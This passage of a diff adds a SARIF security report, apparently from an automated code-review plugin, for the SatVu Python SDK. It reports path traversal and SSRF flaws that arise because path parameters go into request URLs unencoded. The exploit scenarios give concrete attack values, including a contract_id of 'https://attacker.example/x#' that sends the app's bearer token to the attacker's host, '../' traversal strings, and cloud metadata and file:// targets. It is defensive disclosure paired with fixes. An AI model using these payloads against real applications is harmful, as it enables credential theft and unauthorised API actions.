e.g. id = UUID(str(id)), or percent-encode each path segment with urllib.parse.quote(str(id), safe=\"\"). Make this change in the builder template so that every generated path parameter (api.py lines 200, 235, 281, 352, 387 and other services) is covered. Also CWE-918: Coerce path parameters before building the URL (e.g. `id = UUID(str(id))`) or percent-encode every path segment with `urllib.parse.quote(str(id), safe='')`. Fix this in the endpoint_module.py.jinja template so all generated services get it.\n\nCWE-22. Severity MEDIUM, confidence medium."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/services/id/api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 352,
+                  "snippet": {
+                    "text": "            url=f\"/webhooks/{id}/rotate\","
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "IdService.rotate_webhook_signing_key",
+                  "fullyQualifiedName": "IdService.rotate_webhook_signing_key"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F6",
+              "title": "Webhook id is put into the URL path without encoding, so rotate_webhook_signing_key can POST to /client/reset or other endpoints",
+              "impact": "Integrity and availability: an attacker who controls only a webhook id can make the application run state-changing POSTs on other SatVu API endpoints with its credentials, for example resetting its client secret, which causes a denial of service for the integration.",
+              "file": "src/satvu/services/id/api.py",
+              "line": 352,
+              "description": "The caller-supplied `id` (annotated UUID but never checked or converted) goes into the request path verbatim. A string containing `../`, `#` or `?` changes which endpoint the authenticated POST reaches. Every adapter resolves dot segments (urljoin in stdlib/urllib3, URL normalisation in httpx/requests) and drops the fragment, and the Bearer token is still attached. Also CWE-918: The `id` argument is only type-hinted as UUID and is never validated or percent-encoded. It goes verbatim into the request path, and the adapter normalises that path (stdlib/urllib3 `urljoin(self.base_url + '/', url.lstrip('/'))` resolves `../`) before sending it with the integrator's bearer token. A string id holding `../` and `?` therefore sends the request to an endpoint of the caller's choice instead of `/webhooks/{id}/rotate`. get_webhook (200), delete_webhook (235), edit_webhook (281) and test_webhook (387) have the same flaw.",
+              "exploit_scenario": "An integrating application (for example a reseller portal) lets its end users rotate a webhook signing key by id and passes the request value to sdk.id.rotate_webhook_signing_key(id). The attacker submits id=\"../client/reset#\". The path becomes /id/v3/webhooks/../client/reset#/rotate, which resolves to POST https://api.satellitevu.com/id/v3/client/reset with the application's Bearer token. That rotates the application's M2M client secret and cuts off its API access. id=\"../client#\" reaches POST /client instead (create M2M client), and \"../../<service>/...\" reaches other services on the same host with the same token.",
+              "preconditions": [
+                "The integrating application passes an untrusted string as the webhook id (the UUID annotation is not enforced at runtime)",
+                "The application's token is allowed to call the traversed-to endpoint"
+              ],
+              "category": "Path Traversal",
+              "severity": "MEDIUM",
+              "confidence": "medium",
+              "recommendation": "Validate path parameters before building the URL, e.g. id = UUID(str(id)), or percent-encode each path segment with urllib.parse.quote(str(id), safe=\"\"). Make this change in the builder template so that every generated path parameter (api.py lines 200, 235, 281, 352, 387 and other services) is covered. Also CWE-918: Coerce path parameters before building the URL (e.g. `id = UUID(str(id))`) or percent-encode every path segment with `urllib.parse.quote(str(id), safe='')`. Fix this in the endpoint_module.py.jinja template so all generated services get it.",
+              "cwe_id": "CWE-22",
+              "snippet": "            url=f\"/webhooks/{id}/rotate\",",
+              "symbol": "IdService.rotate_webhook_signing_key",
+              "declared_line": 352,
+              "via_change": null,
+              "other_cwe_ids": [
+                "CWE-918"
+              ],
+              "claudeSecurityPluginFindingId": "v3:7380d45b4f5724c8b9078425e0db7b6b1c37b7cbc118d520f936db20798cac02",
+              "verification": {
+                "panel": {
+                  "true": 2,
+                  "false": 1,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-918",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Unencoded contract_id turns into an absolute URL in the stdlib/urllib3 adapters, so the request and its Bearer token go to an attacker-chosen host.\n\nEvery catalog method puts the caller-supplied contract_id into the URL as the first path segment (`f\"/{contract_id}...\"`), typed as a plain `str` and never percent-encoded or validated. The stdlib and urllib3 adapters check for a scheme before running `url.lstrip(\"/\")`, then pass the stripped value to urljoin. A contract_id such as `https://attacker.example` therefore becomes an absolute URL, and the adapter attaches `Authorization: Bearer <token>` to that request.\n\nImpact: The SatVu OAuth access token can be stolen (full API access as the integrating account). The bug also allows SSRF to arbitrary hosts and, with stdlib, to file:// URLs, with the response handed back to the caller.\n\nExploit scenario: A multi-tenant or reseller app built on the SDK takes the contract ID from a query parameter or JSON body and calls sdk.catalog.get_collections(contract_id=...). On a base `pip install satvu`, which uses the stdlib adapter, or with urllib3, an attacker submits contract_id=`https://attacker.example/x#`. The SDK requests `https://attacker.example/x` with the app's OAuth Bearer token, and the attacker then uses that token against the SatVu APIs (orders, wallet, catalog) as the app's account. `http://` sends the token in cleartext. With stdlib, `http://169.254.169.254/...` or `file:///...` also reach internal or local resources, and JSON responses come back to the caller (non-200 bodies are returned raw).\n\nPreconditions: The integrating application passes an attacker-influenced string as contract_id (catalog types it as str; other services use UUID); The stdlib adapter (the default when no optional HTTP extra is installed) or the urllib3 adapter is in use; the httpx and requests adapters keep the request on the base host.\n\nRecommendation: Percent-encode every path parameter with urllib.parse.quote(value, safe=\"\") in the generated templates, and reject IDs that do not match the expected format (contract_id should be a UUID). In the stdlib and urllib3 adapters, stop combining lstrip with urljoin: build full_url by string concatenation onto base_url, then confirm that the resulting scheme and netloc match base_url before attaching the Authorization header.\n\nCWE-918. Severity MEDIUM, confidence medium."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/services/catalog/api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 98,
+                  "snippet": {
+                    "text": "url=f\"/{contract_id}\","
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "CatalogService.landing_page",
+                  "fullyQualifiedName": "CatalogService.landing_page"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F7",
+              "title": "Unencoded contract_id turns into an absolute URL in the stdlib/urllib3 adapters, so the request and its Bearer token go to an attacker-chosen host",
+              "impact": "The SatVu OAuth access token can be stolen (full API access as the integrating account). The bug also allows SSRF to arbitrary hosts and, with stdlib, to file:// URLs, with the response handed back to the caller.",
+              "file": "src/satvu/services/catalog/api.py",
+              "line": 98,
+              "description": "Every catalog method puts the caller-supplied contract_id into the URL as the first path segment (`f\"/{contract_id}...\"`), typed as a plain `str` and never percent-encoded or validated. The stdlib and urllib3 adapters check for a scheme before running `url.lstrip(\"/\")`, then pass the stripped value to urljoin. A contract_id such as `https://attacker.example` therefore becomes an absolute URL, and the adapter attaches `Authorization: Bearer <token>` to that request.",
+              "exploit_scenario": "A multi-tenant or reseller app built on the SDK takes the contract ID from a query parameter or JSON body and calls sdk.catalog.get_collections(contract_id=...). On a base `pip install satvu`, which uses the stdlib adapter, or with urllib3, an attacker submits contract_id=`https://attacker.example/x#`. The SDK requests `https://attacker.example/x` with the app's OAuth Bearer token, and the attacker then uses that token against the SatVu APIs (orders, wallet, catalog) as the app's account. `http://` sends the token in cleartext. With stdlib, `http://169.254.169.254/...` or `file:///...` also reach internal or local resources, and JSON responses come back to the caller (non-200 bodies are returned raw).",
+              "preconditions": [
+                "The integrating application passes an attacker-influenced string as contract_id (catalog types it as str; other services use UUID)",
+                "The stdlib adapter (the default when no optional HTTP extra is installed) or the urllib3 adapter is in use; the httpx and requests adapters keep the request on the base host"
+              ],
+              "category": "Server-Side Request Forgery (SSRF)",
+              "severity": "MEDIUM",
+              "confidence": "medium",
+              "recommendation": "Percent-encode every path parameter with urllib.parse.quote(value, safe=\"\") in the generated templates, and reject IDs that do not match the expected format (contract_id should be a UUID). In the stdlib and urllib3 adapters, stop combining lstrip with urljoin: build full_url by string concatenation onto base_url, then confirm that the resulting scheme and netloc match base_url before attaching the Authorization header.",
+              "cwe_id": "CWE-918",
+              "snippet": "url=f\"/{contract_id}\",",
+              "symbol": "CatalogService.landing_page",
+              "declared_line": 98,
+              "via_change": null,
+              "other_cwe_ids": [],
+              "claudeSecurityPluginFindingId": "v3:3c2551f6b22b8c108ebabea601e2f9e2465b57ce1256b4445c2766f65d13700c",
+              "verification": {
+                "panel": {
+                  "true": 2,
+                  "false": 1,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-918",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Path parameters go into the request URL unencoded, so a contract_id beginning with 'https://' sends the Bearer token to an attacker-chosen host (stdlib/urllib3 backends).\n\ncontract_id, order_id, id and series_id are only type-hinted as UUID. The code never checks or percent-encodes them before f-string interpolation into the request path. The stdlib and urllib3 adapters then strip the leading '/' and urljoin the result onto base_url, so a contract_id such as 'https://attacker.example/x#' becomes an absolute URL that replaces the SatVu host, and the adapter attaches 'Authorization: Bearer <token>' to that request.\n\nImpact: The integrator's API access token leaks to an attacker-controlled host, letting the attacker act as that account (paid tasking orders, data access) until the token expires. Via the non-leading IDs, an app's client-side contract scoping can be bypassed on the API host.\n\nExploit scenario: An integrating app (for example a reseller portal) takes the contract ID as a string from a request or tenant setting and calls sdk.otm.list_orders(contract_id=value). The attacker supplies 'https://attacker.example/c#'. The url becomes '/https://attacker.example/c#/tasking/orders/'. The stdlib adapter strips the leading slash, and urljoin('https://api.satellitevu.com/otm/v2/', 'https://attacker.example/c#/tasking/orders/') returns 'https://attacker.example/c'. urlopen then sends the GET with the integrator's OAuth Bearer token to the attacker, who can replay it against the OTM API until it expires (create or cancel orders, read imagery). 'http://...' also works and sends the token in cleartext. On every backend, the non-leading IDs (order_id, series_id, id) also accept '../' and '?'/'#'. The URL libraries resolve '../' segments, so for example order_id='../../../<other-contract>/tasking/orders/<id>' escapes the contract scope the app intended and acts with the app's token on a different contract's resources.\n\nPreconditions: The integrating application passes an attacker-influenced string (not a uuid.UUID object) as contract_id. For the traversal variant, it passes such a string as order_id/series_id/id.; The token-to-foreign-host variant needs the stdlib or urllib3 backend (stdlib is the default when no optional HTTP extra is installed). The httpx and requests backends keep the host and only allow path/query manipulation.\n\nRecommendation: Validate path parameters as UUIDs (UUID(str(v))) or percent-encode each segment with urllib.parse.quote(str(v), safe='') in the generated URL template. In the adapters, do not urljoin caller paths that resolve to a different scheme/host than base_url; reject or force them to be relative.\n\nCWE-918. Severity MEDIUM, confidence medium."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/services/otm/api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 119,
+                  "snippet": {
+                    "text": "url=f\"/{contract_id}/tasking/orders/\","
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "OtmService.list_orders",
+                  "fullyQualifiedName": "OtmService.list_orders"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F8",
+              "title": "Path parameters go into the request URL unencoded, so a contract_id beginning with 'https://' sends the Bearer token to an attacker-chosen host (stdlib/urllib3 backends)",
+              "impact": "The integrator's API access token leaks to an attacker-controlled host, letting the attacker act as that account (paid tasking orders, data access) until the token expires. Via the non-leading IDs, an app's client-side contract scoping can be bypassed on the API host.",
+              "file": "src/satvu/services/otm/api.py",
+              "line": 119,
+              "description": "contract_id, order_id, id and series_id are only type-hinted as UUID. The code never checks or percent-encodes them before f-string interpolation into the request path. The stdlib and urllib3 adapters then strip the leading '/' and urljoin the result onto base_url, so a contract_id such as 'https://attacker.example/x#' becomes an absolute URL that replaces the SatVu host, and the adapter attaches 'Authorization: Bearer <token>' to that request.",
+              "exploit_scenario": "An integrating app (for example a reseller portal) takes the contract ID as a string from a request or tenant setting and calls sdk.otm.list_orders(contract_id=value). The attacker supplies 'https://attacker.example/c#'. The url becomes '/https://attacker.example/c#/tasking/orders/'. The stdlib adapter strips the leading slash, and urljoin('https://api.satellitevu.com/otm/v2/', 'https://attacker.example/c#/tasking/orders/') returns 'https://attacker.example/c'. urlopen then sends the GET with the integrator's OAuth Bearer token to the attacker, who can replay it against the OTM API until it expires (create or cancel orders, read imagery). 'http://...' also works and sends the token in cleartext. On every backend, the non-leading IDs (order_id, series_id, id) also accept '../' and '?'/'#'. The URL libraries resolve '../' segments, so for example order_id='../../../<other-contract>/tasking/orders/<id>' escapes the contract scope the app intended and acts with the app's token on a different contract's resources.",
+              "preconditions": [
+                "The integrating application passes an attacker-influenced string (not a uuid.UUID object) as contract_id. For the traversal variant, it passes such a string as order_id/series_id/id.",
+                "The token-to-foreign-host variant needs the stdlib or urllib3 backend (stdlib is the default when no optional HTTP extra is installed). The httpx and requests backends keep the host and only allow path/query manipulation."
+              ],
+              "category": "Server-Side Request Forgery (SSRF)",
+              "severity": "MEDIUM",
+              "confidence": "medium",
+              "recommendation": "Validate path parameters as UUIDs (UUID(str(v))) or percent-encode each segment with urllib.parse.quote(str(v), safe='') in the generated URL template. In the adapters, do not urljoin caller paths that resolve to a different scheme/host than base_url; reject or force them to be relative.",
+              "cwe_id": "CWE-918",
+              "snippet": "url=f\"/{contract_id}/tasking/orders/\",",
+              "symbol": "OtmService.list_orders",
+              "declared_line": 119,
+              "via_change": null,
+              "other_cwe_ids": [],
+              "claudeSecurityPluginFindingId": "v3:d8f7ba6b35ecc70b6175f43c0874336d3d336476e7ebb832c51426301050aae1",
+              "verification": {
+                "panel": {
+                  "true": 2,
+                  "false": 1,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-918",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "Generated SDK methods put path parameters into the request URL without percent-encoding, so a caller-supplied ID can redirect the bearer-authenticated request.\n\nThe url macro builds every endpoint URL as \"<path>\".format(param=param) with the raw argument value and never percent-encodes it. Whatever string a calling application passes as a path parameter (catalog contract_id/collection_id/item_id are typed str; UUID hints are not enforced at runtime) goes into the path the HTTP adapter resolves. The bearer token is attached to that request (stdlib_adapter.py:216-218, urllib3_adapter.py:213-215). With the stdlib and urllib3 backends, the URL is resolved by urljoin(base_url + '/', url.lstrip('/')) (stdlib_adapter.py:201, urllib3_adapter.py:198). An absolute URL in the first path segment therefore replaces the SatVu host, and ../ segments are collapsed for every backend.\n\nImpact: Leak of the consuming application's SatVu OAuth bearer token to an attacker-chosen host on the stdlib and urllib3 backends. With every backend, the application's credentials can be aimed at unintended SatVu API endpoints (a confused deputy).\n\nExploit scenario: An application built on the published satvu SDK passes a value from its own user (a tenant/contract selector, or a STAC item or collection id from a URL) into sdk.catalog.landing_page(contract_id=...) or get_item(...). The attacker supplies contract_id=\"https://attacker.example/x#\". The generated code builds url=\"/https://attacker.example/x#\". The stdlib adapter (the default when httpx and requests are not installed) lstrips the slash, and urljoin returns https://attacker.example/x. urlopen then sends the request with 'Authorization: Bearer <app OAuth token>' to the attacker, who can use the token against the application's SatVu account (catalog, orders, tasking, wallet). With any backend, item_id=\"../../../<other path>#\" re-targets the authenticated request to another SatVu API path the application never meant to call.\n\nPreconditions: A consuming application passes attacker-influenced strings into a generated method's path parameter; For the cross-host token leak: the SDK resolves to the stdlib or urllib3 adapter (the default on a minimal pip install satvu with no httpx/requests present). The ../ re-targeting within the API works with any adapter.\n\nRecommendation: In the url macro, emit quote(str(param), safe=\"\") for every path parameter and import urllib.parse.quote in the generated module. As defence in depth, make the stdlib and urllib3 adapters refuse a joined URL whose scheme or host differs from base_url, instead of trusting urljoin.\n\nCWE-918. Severity MEDIUM, confidence medium."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/builder/templates/endpoint_module.py.jinja",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 42,
+                  "snippet": {
+                    "text": "    {{parameter.python_name}}={{parameter.python_name}}"
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "url (Jinja macro)",
+                  "fullyQualifiedName": "url (Jinja macro)"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F9",
+              "title": "Generated SDK methods put path parameters into the request URL without percent-encoding, so a caller-supplied ID can redirect the bearer-authenticated request",
+              "impact": "Leak of the consuming application's SatVu OAuth bearer token to an attacker-chosen host on the stdlib and urllib3 backends. With every backend, the application's credentials can be aimed at unintended SatVu API endpoints (a confused deputy).",
+              "file": "src/builder/templates/endpoint_module.py.jinja",
+              "line": 42,
+              "description": "The url macro builds every endpoint URL as \"<path>\".format(param=param) with the raw argument value and never percent-encodes it. Whatever string a calling application passes as a path parameter (catalog contract_id/collection_id/item_id are typed str; UUID hints are not enforced at runtime) goes into the path the HTTP adapter resolves. The bearer token is attached to that request (stdlib_adapter.py:216-218, urllib3_adapter.py:213-215). With the stdlib and urllib3 backends, the URL is resolved by urljoin(base_url + '/', url.lstrip('/')) (stdlib_adapter.py:201, urllib3_adapter.py:198). An absolute URL in the first path segment therefore replaces the SatVu host, and ../ segments are collapsed for every backend.",
+              "exploit_scenario": "An application built on the published satvu SDK passes a value from its own user (a tenant/contract selector, or a STAC item or collection id from a URL) into sdk.catalog.landing_page(contract_id=...) or get_item(...). The attacker supplies contract_id=\"https://attacker.example/x#\". The generated code builds url=\"/https://attacker.example/x#\". The stdlib adapter (the default when httpx and requests are not installed) lstrips the slash, and urljoin returns https://attacker.example/x. urlopen then sends the request with 'Authorization: Bearer <app OAuth token>' to the attacker, who can use the token against the application's SatVu account (catalog, orders, tasking, wallet). With any backend, item_id=\"../../../<other path>#\" re-targets the authenticated request to another SatVu API path the application never meant to call.",
+              "preconditions": [
+                "A consuming application passes attacker-influenced strings into a generated method's path parameter",
+                "For the cross-host token leak: the SDK resolves to the stdlib or urllib3 adapter (the default on a minimal pip install satvu with no httpx/requests present). The ../ re-targeting within the API works with any adapter"
+              ],
+              "category": "Server-Side Request Forgery (SSRF)",
+              "severity": "MEDIUM",
+              "confidence": "medium",
+              "recommendation": "In the url macro, emit quote(str(param), safe=\"\") for every path parameter and import urllib.parse.quote in the generated module. As defence in depth, make the stdlib and urllib3 adapters refuse a joined URL whose scheme or host differs from base_url, instead of trusting urljoin.",
+              "cwe_id": "CWE-918",
+              "snippet": "    {{parameter.python_name}}={{parameter.python_name}}",
+              "symbol": "url (Jinja macro)",
+              "declared_line": 42,
+              "via_change": null,
+              "other_cwe_ids": [],
+              "claudeSecurityPluginFindingId": "v3:d088381e06bf7e7beb11b5e2ee9b757664f6367af18d6348655205ca506865c8",
+              "verification": {
+                "panel": {
+                  "true": 2,
+                  "false": 1,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-22",
+          "ruleIndex": 2,
+          "level": "note",
+          "message": {
+            "text": "Unencoded collection_id/item_id/contract_id let '../', '?' and '#' redirect catalog calls to arbitrary SatVu API paths with the app's token.\n\nPath parameters taken from the caller are interpolated straight into the request path. Nothing percent-encodes them or rejects '/', '..', '?' or '#'. Dot segments are resolved on the client (urljoin in stdlib/urllib3, URL normalisation in requests/urllib3 parse_url and httpx), and '?'/'#' cut off the rest of the intended path. An ID value can therefore leave /catalog/v1/{contract}/ and reach any endpoint on api[.env].satellitevu.com, carrying the application's bearer token. Also CWE-918: collection_id and item_id are caller-supplied strings placed raw into the request path. Dot segments are resolved by urljoin (stdlib/urllib3) and by URL normalisation in requests/urllib3.parse_url and httpx. '?' or '#' cut off the rest of the path. As a result, an ID value can send the token-bearing request to any path on api.satellitevu.com, including other contract IDs and other services such as /cos, /otm, /wallet and /id.\n\nImpact: Confused-deputy access to other SatVu API resources and contracts that the application's credentials can reach, which bypasses the application's own per-user scoping. The impact stays within the SatVu API host and is bounded by the server-side authorisation of the application's token.\n\nExploit scenario: An application fixes contract_id for each customer but takes item_id from the end user, for example from a link in a catalog UI, and calls sdk.catalog.get_item(contract_id=tenant_contract, collection_id='primary', item_id=user_value). The attacker sends item_id='../../../../../<other_contract>/collections/primary/items/<x>' or '../../../../../otm/v2/<contract>/...?'. The SDK resolves this to a different contract or API on the same host and sends it with the application's token. The response comes back to the application: raw JSON when the status is not 200, or a model with extra='allow', or a ValueError that includes pydantic input details. The attacker can read data the application meant to keep from them. post_collection_search does the same with a POST and a JSON body sent to the redirected path.\n\nPreconditions: The integrating application passes an untrusted value as contract_id, collection_id or item_id; The application's credential can access resources beyond what the end user should see, and the application returns the response or error to the user.\n\nRecommendation: Encode each path parameter as a single segment (urllib.parse.quote(str(v), safe='')) in the endpoint template that generates api.py. Optionally reject values that are '.' or '..', or that contain '/', '?' or '#', before building the request. Also CWE-918: URL-encode every path parameter with quote(value, safe=\"\") in the endpoint template, so '/', '?', '#' and '..' cannot change the path structure, and validate IDs against the expected pattern.\n\nCWE-22. Severity LOW, confidence medium."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/services/catalog/api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 287,
+                  "snippet": {
+                    "text": "            url=f\"/{contract_id}/collections/{collection_id}/{item_id}\","
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "CatalogService.get_item",
+                  "fullyQualifiedName": "CatalogService.get_item"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F10",
+              "title": "Unencoded collection_id/item_id/contract_id let '../', '?' and '#' redirect catalog calls to arbitrary SatVu API paths with the app's token",
+              "impact": "Confused-deputy access to other SatVu API resources and contracts that the application's credentials can reach, which bypasses the application's own per-user scoping. The impact stays within the SatVu API host and is bounded by the server-side authorisation of the application's token.",
+              "file": "src/satvu/services/catalog/api.py",
+              "line": 287,
+              "description": "Path parameters taken from the caller are interpolated straight into the request path. Nothing percent-encodes them or rejects '/', '..', '?' or '#'. Dot segments are resolved on the client (urljoin in stdlib/urllib3, URL normalisation in requests/urllib3 parse_url and httpx), and '?'/'#' cut off the rest of the intended path. An ID value can therefore leave /catalog/v1/{contract}/ and reach any endpoint on api[.env].satellitevu.com, carrying the application's bearer token. Also CWE-918: collection_id and item_id are caller-supplied strings placed raw into the request path. Dot segments are resolved by urljoin (stdlib/urllib3) and by URL normalisation in requests/urllib3.parse_url and httpx. '?' or '#' cut off the rest of the path. As a result, an ID value can send the token-bearing request to any path on api.satellitevu.com, including other contract IDs and other services such as /cos, /otm, /wallet and /id.",
+              "exploit_scenario": "An application fixes contract_id for each customer but takes item_id from the end user, for example from a link in a catalog UI, and calls sdk.catalog.get_item(contract_id=tenant_contract, collection_id='primary', item_id=user_value). The attacker sends item_id='../../../../../<other_contract>/collections/primary/items/<x>' or '../../../../../otm/v2/<contract>/...?'. The SDK resolves this to a different contract or API on the same host and sends it with the application's token. The response comes back to the application: raw JSON when the status is not 200, or a model with extra='allow', or a ValueError that includes pydantic input details. The attacker can read data the application meant to keep from them. post_collection_search does the same with a POST and a JSON body sent to the redirected path.",
+              "preconditions": [
+                "The integrating application passes an untrusted value as contract_id, collection_id or item_id",
+                "The application's credential can access resources beyond what the end user should see, and the application returns the response or error to the user"
+              ],
+              "category": "Path Traversal",
+              "severity": "LOW",
+              "confidence": "medium",
+              "recommendation": "Encode each path parameter as a single segment (urllib.parse.quote(str(v), safe='')) in the endpoint template that generates api.py. Optionally reject values that are '.' or '..', or that contain '/', '?' or '#', before building the request. Also CWE-918: URL-encode every path parameter with quote(value, safe=\"\") in the endpoint template, so '/', '?', '#' and '..' cannot change the path structure, and validate IDs against the expected pattern.",
+              "cwe_id": "CWE-22",
+              "snippet": "            url=f\"/{contract_id}/collections/{collection_id}/{item_id}\",",
+              "symbol": "CatalogService.get_item",
+              "declared_line": 287,
+              "via_change": null,
+              "other_cwe_ids": [
+                "CWE-918"
+              ],
+              "claudeSecurityPluginFindingId": "v3:08e529954a2460e41d16d1ccce7d193166ae412376cdf915bd58b3b1b8907fc0",
+              "verification": {
+                "panel": {
+                  "true": 2,
+                  "false": 1,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-22",
+          "ruleIndex": 2,
+          "level": "note",
+          "message": {
+            "text": "item_id is interpolated into the download URL path without encoding, so '../', '?' and '#' change the request target.\n\nThe caller-supplied item_id (a plain str, never percent-encoded anywhere in the SDK, since there is no quote() call in src/satvu) goes straight into the request path. The adapters then send it to the API host with the app's Bearer token. In the stdlib and urllib3 adapters, urljoin resolves dot segments on the client side (stdlib_adapter.py:201, urllib3_adapter.py:198), so a crafted item_id points the authenticated GET at any path on api.<env>.satellitevu.com. Also CWE-918: item_id is a free-form str that goes into the request path with no percent-encoding. The adapters then build the URL with urljoin (stdlib_adapter.py:201, urllib3_adapter.py:198), which resolves '../' segments, and httpx/requests normalise dot segments too. A '#' or '?' in item_id cuts off the '/download' suffix and the SDK's own query string. So an item_id from an untrusted end user can point the request, with the integrator's Bearer token, at a different order or any other GET endpoint on api.satellitevu.com.\n\nImpact: Confused-deputy read: the attacker can bypass the application's per-order authorization, or make the SDK issue authenticated GETs to other API paths on the SatVu host using the integrating app's credentials.\n\nExploit scenario: A reseller or multi-tenant portal built on the SDK checks that the end user owns order O1, then calls sdk.cos.download_order_item(contract_id, O1, item_id=request.args['item']). The attacker sends item='../O2/ITEMX'. The URL /orders/v3/C/O1/../O2/ITEMX/download resolves to /orders/v3/C/O2/ITEMX/download, so the app's service-account token fetches an item from an order the app's ownership check never covered. Values like '../../../../id/v3/<path>?' reach GET endpoints of other services on the same host. Any non-200/202 2xx JSON comes back raw to the caller, and 200 bodies end up partly in the ValueError raised by parse_response.\n\nPreconditions: The integrating application passes an untrusted string as item_id (contract_id and order_id are also unencoded but typed UUID); The attacker can see the downloaded content or the returned JSON through the application.\n\nRecommendation: Percent-encode every path parameter with urllib.parse.quote(str(v), safe='') in the generated endpoint template before building the URL. Also validate UUID-typed parameters at runtime (UUID(str(v))). Also CWE-918: Percent-encode every path parameter before interpolating it, e.g. quote(str(item_id), safe=\"\"), in the endpoint template so all generated services get it. Optionally reject IDs containing '/', '..', '?' or '#'. Convert contract_id/order_id with UUID(str(x)) at runtime, since the type hints are not enforced.\n\nCWE-22. Severity LOW, confidence medium."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/satvu/services/cos/api.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 393,
+                  "snippet": {
+                    "text": "            url=f\"/{contract_id}/{order_id}/{item_id}/download\","
+                  }
+                }
+              },
+              "logicalLocations": [
+                {
+                  "name": "CosService.download_order_item",
+                  "fullyQualifiedName": "CosService.download_order_item"
+                }
+              ]
+            }
+          ],
+          "properties": {
+            "claudeSecurityPlugin": {
+              "id": "F11",
+              "title": "item_id is interpolated into the download URL path without encoding, so '../', '?' and '#' change the request target",
+              "impact": "Confused-deputy read: the attacker can bypass the application's per-order authorization, or make the SDK issue authenticated GETs to other API paths on the SatVu host using the integrating app's credentials.",
+              "file": "src/satvu/services/cos/api.py",
+              "line": 393,
+              "description": "The caller-supplied item_id (a plain str, never percent-encoded anywhere in the SDK, since there is no quote() call in src/satvu) goes straight into the request path. The adapters then send it to the API host with the app's Bearer token. In the stdlib and urllib3 adapters, urljoin resolves dot segments on the client side (stdlib_adapter.py:201, urllib3_adapter.py:198), so a crafted item_id points the authenticated GET at any path on api.<env>.satellitevu.com. Also CWE-918: item_id is a free-form str that goes into the request path with no percent-encoding. The adapters then build the URL with urljoin (stdlib_adapter.py:201, urllib3_adapter.py:198), which resolves '../' segments, and httpx/requests normalise dot segments too. A '#' or '?' in item_id cuts off the '/download' suffix and the SDK's own query string. So an item_id from an untrusted end user can point the request, with the integrator's Bearer token, at a different order or any other GET endpoint on api.satellitevu.com.",
+              "exploit_scenario": "A reseller or multi-tenant portal built on the SDK checks that the end user owns order O1, then calls sdk.cos.download_order_item(contract_id, O1, item_id=request.args['item']). The attacker sends item='../O2/ITEMX'. The URL /orders/v3/C/O1/../O2/ITEMX/download resolves to /orders/v3/C/O2/ITEMX/download, so the app's service-account token fetches an item from an order the app's ownership check never covered. Values like '../../../../id/v3/<path>?' reach GET endpoints of other services on the same host. Any non-200/202 2xx JSON comes back raw to the caller, and 200 bodies end up partly in the ValueError raised by parse_response.",
+              "preconditions": [
+                "The integrating application passes an untrusted string as item_id (contract_id and order_id are also unencoded but typed UUID)",
+                "The attacker can see the downloaded content or the returned JSON through the application"
+              ],
+              "category": "Path Traversal",
+              "severity": "LOW",
+              "confidence": "medium",
+              "recommendation": "Percent-encode every path parameter with urllib.parse.quote(str(v), safe='') in the generated endpoint template before building the URL. Also validate UUID-typed parameters at runtime (UUID(str(v))). Also CWE-918: Percent-encode every path parameter before interpolating it, e.g. quote(str(item_id), safe=\"\"), in the endpoint template so all generated services get it. Optionally reject IDs containing '/', '..', '?' or '#'. Convert contract_id/order_id with UUID(str(x)) at runtime, since the type hints are not enforced.",
+              "cwe_id": "CWE-22",
+              "snippet": "            url=f\"/{contract_id}/{order_id}/{item_id}/download\",",
+              "symbol": "CosService.download_order_item",
+              "declared_line": 393,
+              "via_change": null,
+              "other_cwe_ids": [
+                "CWE-918"
+              ],
+              "claudeSecurityPluginFindingId": "v3:aa354770d585054cc6a0d00b0bcef257fa8e4b5338239cee96c5b7fc1d3cee32",
+              "verification": {
+                "panel": {
+                  "true": 3,
+                  "false": 0,
+                  "voters": 3
+                }
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-918",
+          "ruleIndex": 0,
+          "level": "note",
+          "message": {
